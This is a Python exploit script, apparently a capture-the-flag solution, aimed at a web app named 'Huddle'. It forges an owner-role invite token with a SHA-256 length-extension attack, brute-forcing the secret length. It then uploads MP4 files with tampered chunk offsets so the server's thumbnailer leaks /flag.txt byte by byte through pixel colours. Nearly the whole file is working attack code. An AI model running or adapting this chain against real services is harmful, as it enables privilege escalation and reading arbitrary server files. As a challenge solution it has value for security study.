#!/usr/bin/env python3
from __future__ import annotations
import argparse,base64,json,struct,sys,time
from pathlib import Path
import requests
from PIL import Image

HERE=Path(__file__).resolve().parent
TEMPLATE=HERE/"flag_alis.mp4"
LOOKUP_PATH=HERE/"pal8_lookup.json"

K=[0x428A2F98,0x71374491,0xB5C0FBCF,0xE9B5DBA5,0x3956C25B,0x59F111F1,0x923F82A4,0xAB1C5ED5,0xD807AA98,0x12835B01,0x243185BE,0x550C7DC3,0x72BE5D74,0x80DEB1FE,0x9BDC06A7,0xC19BF174,0xE49B69C1,0xEFBE4786,0x0FC19DC6,0x240CA1CC,0x2DE92C6F,0x4A7484AA,0x5CB0A9DC,0x76F988DA,0x983E5152,0xA831C66D,0xB00327C8,0xBF597FC7,0xC6E00BF3,0xD5A79147,0x06CA6351,0x14292967,0x27B70A85,0x2E1B2138,0x4D2C6DFC,0x53380D13,0x650A7354,0x766A0ABB,0x81C2C92E,0x92722C85,0xA2BFE8A1,0xA81A664B,0xC24B8B70,0xC76C51A3,0xD192E819,0xD6990624,0xF40E3585,0x106AA070,0x19A4C116,0x1E376C08,0x2748774C,0x34B0BCB5,0x391C0CB3,0x4ED8AA4A,0x5B9CCA4F,0x682E6FF3,0x748F82EE,0x78A5636F,0x84C87814,0x8CC70208,0x90BEFFFA,0xA4506CEB,0xBEF9A3F7,0xC67178F2]
def _rotr(x,n): return ((x>>n)|(x<<(32-n)))&0xFFFFFFFF
def _compress(state,block):
    w=list(struct.unpack(">16I",block))
    for i in range(16,64):
        s0=_rotr(w[i-15],7)^_rotr(w[i-15],18)^(w[i-15]>>3)
        s1=_rotr(w[i-2],17)^_rotr(w[i-2],19)^(w[i-2]>>10)
        w.append((w[i-16]+s0+w[i-7]+s1)&0xFFFFFFFF)
    a,b,c,d,e,f,g,h=state
    for i in range(64):
        s1=_rotr(e,6)^_rotr(e,11)^_rotr(e,25); ch=(e&f)^((~e)&g)
        t1=(h+s1+ch+K[i]+w[i])&0xFFFFFFFF
        s0=_rotr(a,2)^_rotr(a,13)^_rotr(a,22); maj=(a&b)^(a&c)^(b&c)
        t2=(s0+maj)&0xFFFFFFFF
        h,g,f,e,d,c,b,a=g,f,e,(d+t1)&0xFFFFFFFF,c,b,a,(t1+t2)&0xFFFFFFFF
    return [(x+y)&0xFFFFFFFF for x,y in zip(state,[a,b,c,d,e,f,g,h])]
def sha_padding(length):
    pad=b"\x80"; pad+=b"\x00"*((56-(length+1)%64)%64); pad+=struct.pack(">Q",length*8); return pad
def sha256_extend(digest_hex,known,append,secret_len):
    state=list(struct.unpack(">8I",bytes.fromhex(digest_hex)))
    glue=sha_padding(secret_len+len(known)); already=secret_len+len(known)+len(glue)
    msg=append+sha_padding(already+len(append))
    for i in range(0,len(msg),64): state=_compress(state,msg[i:i+64])
    return known+glue+append,struct.pack(">8I",*state).hex()
def b64url(data): return base64.b64encode(data).decode().rstrip("=")
def b64decode_unpadded(s): return base64.b64decode(s+"="*((4-len(s)%4)%4))

def patch_mp4(template,offset):
    d=bytearray(template)
    depth=d.find(b"\x00\x18\xff\xff")
    if depth<0: depth=d.find(b"\x00\x08\xff\xff")
    if depth<0: raise SystemExit("stsd depth not found")
    struct.pack_into(">H",d,depth,8)
    stsz=d.find(b"stsz"); struct.pack_into(">I",d,stsz+8,1)
    stco=d.find(b"stco"); n=struct.unpack(">I",d[stco+8:stco+12])[0]
    for k in range(n): struct.pack_into(">I",d,stco+12+4*k,offset)
    return bytes(d)
def load_lookup():
    raw=json.loads(LOOKUP_PATH.read_text())
    lookup={int(k):tuple(v) for k,v in raw.items() if v}
    rev={px:i for i,px in lookup.items()}
    return lookup,rev
def invert_pixel(px,lookup,rev):
    px=tuple(px[:3])
    if px in rev: return rev[px],0
    best=None
    for i,q in lookup.items():
        dist=sum(abs(a-b) for a,b in zip(px,q))
        if best is None or dist<best[0]: best=(dist,i)
    return best[1],best[0]

class Huddle:
    def __init__(self,base):
        self.base=base.rstrip("/"); self.s=requests.Session(); self.s.headers["User-Agent"]="huddle-poc"
    def _retry(self,fn,tries=5):
        last=None
        for i in range(tries):
            try: return fn()
            except (requests.ConnectionError,requests.Timeout) as e:
                last=e; time.sleep(1.2+i*0.4); continue
        raise last
    def login(self,e,p): return self._retry(lambda:self.s.post(self.base+"/api/login",json={"email":e,"password":p},timeout=20)).json()
    def register(self,e,p):
        r=self._retry(lambda:self.s.post(self.base+"/api/register",json={"email":e,"password":p},timeout=20)); return r
    def me(self): return self._retry(lambda:self.s.get(self.base+"/api/me",timeout=20)).json()
    def invite(self): return self._retry(lambda:self.s.get(self.base+"/api/invite",timeout=20)).json()
    def enable_video(self):
        return self._retry(lambda:self.s.post(self.base+"/api/workspace/settings",json={"video_messages":True},timeout=20)).json()
    def join(self,token,sig):
        r=self._retry(lambda:self.s.post(self.base+"/api/join",json={"token":token,"sig":sig},timeout=20))
        return r.status_code,(r.json() if r.headers.get("content-type","").startswith("application/json") else r.text)
    def upload(self,blob):
        r=self._retry(lambda:self.s.post(self.base+"/api/files/upload",data=blob,headers={"Content-Type":"application/octet-stream"},timeout=25))
        if r.status_code!=201: raise RuntimeError(f"upload {r.status_code} {r.text[:200]}")
        return r.json()["file_id"]
    def thumbnail(self,fid):
        r=self._retry(lambda:self.s.post(self.base+"/api/files/thumbnail",json={"file_id":fid},timeout=25))
        return r.status_code,(r.json() if r.headers.get("content-type","").startswith("application/json") else r.text)
    def get_bytes(self,path):
        r=self._retry(lambda:self.s.get(self.base+path,timeout=20)); r.raise_for_status(); return r.content

def become_owner(api,email,password,secret_len):
    print("[*] register/login",email)
    try: api.register(email,password)
    except requests.HTTPError: pass
    api.login(email,password); time.sleep(0.3)
    print("[*] me",api.me())
    inv=api.invite(); token,sig=inv["token"],inv["sig"]
    known=b64decode_unpadded(token); print("[*] invite known",known,"sig",sig)
    lengths=[secret_len] if secret_len else list(range(16,40))
    for sl in lengths:
        nm,ns=sha256_extend(sig,known,b"&role=owner",sl); nt=b64url(nm)
        code,body=api.join(nt,ns)
        ok = code==200 and isinstance(body,dict) and body.get("role")=="owner"
        print(f"    secret_len={sl} -> {code} {body}")
        if ok:
            print("[+] owner, secret_len",sl); return sl
    raise SystemExit("length extension failed")

def read_flag_txt(api,template,lookup,rev,max_len=80):
    out=bytearray()
    for off in range(max_len):
        blob=patch_mp4(template,off)
        fid=api.upload(blob)
        code,body=api.thumbnail(fid)
        if code==422: print(f"[*] EOF at offset {off}"); break
        if code!=201 or not isinstance(body,dict) or "thumb_url" not in body:
            print(f"    skip off={off} {code} {body}"); 
            if isinstance(body,dict) and body.get("error","").startswith("could not"):
                print(f"[*] EOF-like at {off}"); break
            continue
        jpg=api.get_bytes(body["thumb_url"])
        px=list(Image.open(__import__("io").BytesIO(jpg)).getdata())[0][:3]
        b,dist=invert_pixel(px,lookup,rev); out.append(b)
        ch=chr(b) if 32<=b<127 else "."
        print(f"    [{off:02d}] {b:3d} {ch!r} dist={dist}  {out.decode('latin1','replace')}")
    return bytes(out)

def extract_flagy(raw):
    s=raw.decode("latin1","replace"); i=s.find("FlagY{")
    if i<0: return s
    j=s.find("}",i); return s[i:j+1] if j>=0 else s[i:]

def main():
    ap=argparse.ArgumentParser(); ap.add_argument("base"); ap.add_argument("--email",default="you@company.now")
    ap.add_argument("--password",default="pwner1pwner1"); ap.add_argument("--secret-len",type=int,default=0)
    args=ap.parse_args()
    if not TEMPLATE.is_file(): raise SystemExit(f"missing {TEMPLATE}")
    if not LOOKUP_PATH.is_file(): raise SystemExit(f"missing {LOOKUP_PATH}")
    sl=None if args.secret_len==0 else args.secret_len
    lookup,rev=load_lookup(); api=Huddle(args.base)
    email=args.email or f"pwn{int(time.time())}@x.tld"
    become_owner(api,email,args.password,sl)
    print("[*] enable video_messages",api.enable_video())
    time.sleep(0.3)
    raw=read_flag_txt(api,TEMPLATE.read_bytes(),lookup,rev)
    flag=extract_flagy(raw)
    print(); print("[*] /flag.txt =",raw); print("[+] FLAG",flag)

if __name__=="__main__": main()
